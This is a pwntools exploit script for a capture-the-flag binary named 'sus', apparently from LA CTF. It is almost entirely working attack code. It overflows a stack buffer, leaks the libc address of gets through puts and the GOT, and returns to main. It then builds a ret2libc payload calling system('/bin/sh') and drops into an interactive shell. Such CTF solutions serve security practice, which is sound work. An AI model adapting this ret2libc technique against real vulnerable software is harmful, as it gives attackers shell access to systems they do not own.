#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sus
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'sus_patched')
libc = ELF("./libc.so.6")
r = ROP("sus")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
#io = remote( 'chall.lac.tf', 31284)

# STAGE 1: Leak memory 
# payload 56*a + function_param + 8*a (padding to return) + function + rop
payload = 56*b'A' + p64(exe.got['gets']) + 8*b'A' + p64(exe.plt['puts']) + p64(exe.sym.main)
io.sendline(payload)

print(io.recvline())
leak = io.recvline()
log.success(hex(int.from_bytes(leak[::-1])))
leak = int.from_bytes(leak[::-1])
leak = leak & 0xffffffffffff
log.success(hex(leak))

libc.address =  leak - libc.sym['gets']
log.success("Base of libc: " + hex(libc.address))

# STAGE 2: call system
# payload will call system('/bin/sh')

binsh = next(libc.search(b'/bin/sh'))
payload = 56*b'A' + p64(binsh) + 8*b'A' + p64(r.ret.address) + p64(libc.sym.system)
# needs stack alignment
#payload = 56*b'A' + p64(binsh) + 8*b'A' + p64(libc.sym.system)

io.sendline(payload)

io.interactive()

